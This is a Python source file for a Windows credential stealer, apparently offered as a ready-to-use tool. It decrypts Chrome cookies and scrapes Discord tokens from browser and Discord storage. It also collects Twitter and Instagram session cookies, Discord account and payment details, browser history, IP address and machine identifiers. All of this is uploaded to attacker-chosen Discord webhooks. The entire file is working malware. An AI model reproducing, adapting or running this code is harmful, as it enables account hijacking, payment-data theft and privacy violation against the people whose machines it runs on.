import json
import os, io
import sys
from json import loads
from base64 import b64decode
from sqlite3 import connect
from shutil import copyfile
from threading import Thread 
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook
from subprocess import Popen, PIPE
from urllib.request import urlopen, Request
from requests import get
from re import findall, search
import win32con
from win32api import SetFileAttributes
import browser_cookie3
from browser_history import get_history
from prettytable import PrettyTable

website = ['discord.com', 'twitter.com', 'instagram.com']

def get_hwid():
    p = Popen('wmic csproduct get uuid', shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]

def get_user_data(tk):
    headers = {'Authorization': tk}
    response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    return [response['username'], response['discriminator'], response['email'], response['phone']]

def has_payment_methods(tk):
    headers = {'Authorization': tk}
    response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
    return response

def cookies_grabber_mod(u):
    cookies = []
    browsers = [
        "chrome",
        "edge",
        "firefox",
        "brave",
        "opera",
        "vivaldi",
        "chromium",
    ]
    for browser in browsers:
        try:
            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
        except:
            pass
    return cookies

def get_Personal_data():
    hwid = get_hwid()
    pc_username = os.getenv('UserName')
    pc_name = os.getenv('COMPUTERNAME')
    try:
        ip_address=urlopen(Request('https://api64.ipify.org')).read().decode().strip()
        country=urlopen(Request(f'https://ipapi.co/{ip_address}/country_name')).read().decode().strip()
        city=urlopen(Request(f'https://ipapi.co/{ip_address}/city')).read().decode().strip()
    except:
        city="City not found -_-"
        country="Country not found -_-"
        ip_address="No IP found -_-"
    return f"**PC name:** `{pc_name}`\n**Pc username:** `{pc_username}`\n**Ip Adress:** `{ip_address}`\n**Country:** `{country}`\n**City:** `{city}`\n**HWID:** `{hwid}`"

def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["CurrentTime", "Link"]
    for his in get_history().histories:
        a, b = his
        if len(b) <= 100:
            table.add_row([a, b])
        else:
            x_= b.split("//")
            x__, x___= x_[1].count('/'), x_[1].split('/')
            if x___[0] != 'www.google.com':
                if x__ <= 5:
                    b = f"{x_[0]}//"
                    for p in x___:
                        if x___.index(p) != len(x___) - 1:
                            b += f"{p}/"
                    if len(b) <= 100:
                        table.add_row([a, b])
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                else:
                    b = f"{x_[0]}//{x___[0]}/[...]"
                    if len(b) <= 100:
                        table.add_row([a, b]) 
                    else:
                        table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
    return table.get_string()

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)

    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""
def main():
    filename = "Cookies.db"
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")

    if not os.path.isfile(filename):
        copyfile(db_path, filename)
        SetFileAttributes(filename, win32con.FILE_ATTRIBUTE_HIDDEN)
    db = connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    result = []
    for w in website:
        if w == 'discord.com':
            tokens = []
            def discord_tokens(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                            for token in findall(regex, line):
                                if token not in tokens:
                                    tokens.append(token)
            paths = [
                os.path.join(os.getenv('LOCALAPPDATA'),"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Discord", "Local Storage", "leveldb"),
                os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
                os.path.join(os.getenv('APPDATA'), "discordptb"),
                os.path.join(os.getenv('APPDATA'), "discordcanary"),
                os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
                os.path.join(os.getenv('LOCALAPPDATA'), "Yandex", "YandexBrowser", "User Data", "Default")
            ]
            threads = []
            def find_wb(wb):
                if os.path.exists(wb):
                    threads.append(Thread(target=discord_tokens, args=(wb,)))
            for j in paths:
                find_wb(j)
            for t in threads:
                t.start()
                t.join()
            final_tokens = ''
            for n in tokens:
                final_tokens += f"- {n}\n"
            result.append(f"""=====================================================\nDISCORD INFO:\n\nHost: {w}\nCookie name: TOKEN\nCookie value [discord token(s)]:\n\n{final_tokens}=====================================================""")
        elif w == 'twitter.com':
            t_cookies = []
            for b in cookies_grabber_mod('twitter.com'):
                t_cookies.append(b.split(', '))
            t_lst = []
            for c in t_cookies:
                for y in c:
                    if search(r"auth_token", y) != None:
                        dt = y.split(' ')[1].split("=")[1]
                        if dt not in t_lst:
                            t_lst.append(dt)
            if len(t_lst) != 0:
                result.append(f"""TWITTER INFO:\n\nHost: twitter.com\nCookie name: auth_token\nCookie value [twitter authentification key]: {t_lst}\n=====================================================""")
        elif w == 'instagram.com':
            instaLst = []
            cursor.execute(f"""
            SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
            FROM cookies WHERE host_key like '%{w}%'""")
            key = get_encryption_key()
            for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                if not value:
                    decrypted_value = decrypt_data(encrypted_value, key)
                else:
                    decrypted_value = value
                instaLst.append({'domain': f"{host_key}", "name": f"{name}", "value": f"{decrypted_value}"})
            if len(instaLst) != 0:    
                result.append(f"INSTAGRAM INFO:\n\n{json.dumps(instaLst, indent=4)}\n=====================================================\n")
            else:
                insta_cookies = []
                for b in cookies_grabber_mod('instagram.com'):
                    insta_cookies.append(b.split(', '))
                insta_lst = []
                insta_dupl = []
                for c in insta_cookies:
                    for y in c:
                        if search(r"ds_user_id", y) != None:
                            dt = y.split(' ')[1].split("=")[1]
                            if dt not in insta_dupl:  
                                insta_dupl.append(dt)                          
                                insta_lst.append(c)
                if len(insta_lst) != 0:
                    insta_formated = 'INSTAGRAM ALL COOKIES FOUNDED:\n\n'
                    for h in insta_lst:
                        insta_formated += f"{h}\n"
                    result.append(insta_formated)
    try:
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))
    except:
        pass
    data = ''
    for r in result:
        data += f"{r}\n"
    all_data, all_data_p, lst, lst_b = [], [], '', ''
    for x in tokens:
        try:
            lst = get_user_data(x)
            username, email, phone = f"{lst[0]}#{lst[1]}", lst[2], lst[3]
            if [username, email, phone] not in all_data:
                all_data.append([username, email, phone]) 
        except:
            pass
        lst_b = has_payment_methods(x)
        try:
            for n in range(len(lst_b)):
                if lst_b[n]['type'] == 1:
                    writable = [lst_b[n]['brand'], lst_b[n]['type'], lst_b[n]['last_4'], lst_b[n]['expires_month'], lst_b[n]['expires_year'], lst_b[n]['billing_address']]
                    if writable not in all_data_p:
                        all_data_p.append(writable)
                elif lst_b[n]['type'] == 2:
                    writable_2 = [lst_b[n]['email'], lst_b[n]['type'], lst_b[n]['billing_address']]
                    if writable_2 not in all_data_p:
                        all_data_p.append(writable_2)
        except:
            pass
    data += "DISCORD ACCOUNT INFO FOUNDED:\n\n"
    for g in all_data:
        data += f"""\nPseudo: {all_data[all_data.index(g)][0]}\nDiscord email: {all_data[all_data.index(g)][1]}\nDiscord phone num: {all_data[all_data.index(g)][2]}
        \n====================================================="""
    def discord_info_w(x, y):
        data += f"""Billings Adress:\n{all_data_p[x][y]['name']}\n{all_data_p[x][y]['line_1']}\n{all_data_p[x][y]['line_2']}
        \nCity and state: {all_data_p[x][y]['city']} - {all_data_p[x][y]['state']}\nCountry: {all_data_p[x][y]['country']}\nPostal Code: {all_data_p[x][y]['postal_code']}
        \n=====================================================\n"""
    data += "\nDISCORD PAYMENT INFO FOUNDED:\n"
    for b in all_data_p:
        m = all_data_p.index(b)
        if all_data_p[m][1] == 1:
            data += f"Provider: {all_data_p[m][0]}\nLast_4: {all_data_p[m][2]}\nExpire: {all_data_p[m][3]}/{all_data_p[m][4]}\n-------------------------------\n"
            discord_info_w(m, 5)
        elif all_data_p[m][1] == 2:
            data += f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n"
            discord_info_w(m, 2)
    db.commit()
    db.close()
    try:
        os.remove('Cookies.db')
    except:
        pass
    return data

def send_webhook(DISCORD_WEBHOOK_URLs):
    for URL in DISCORD_WEBHOOK_URLs:
        webhook = DiscordWebhook(url=URL, content=get_Personal_data(), username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
        webhook.add_file(file=main(), filename='data.txt')
        webhook.add_file(file=find_His(), filename='user_history.txt')
        webhook.execute()

if __name__ == "__main__":
    if len(sys.argv) == 1:
        send_webhook(['YOUR DISCORD WEBHOOK URL'])
    else:
        del sys.argv[0]
        send_webhook(sys.argv)
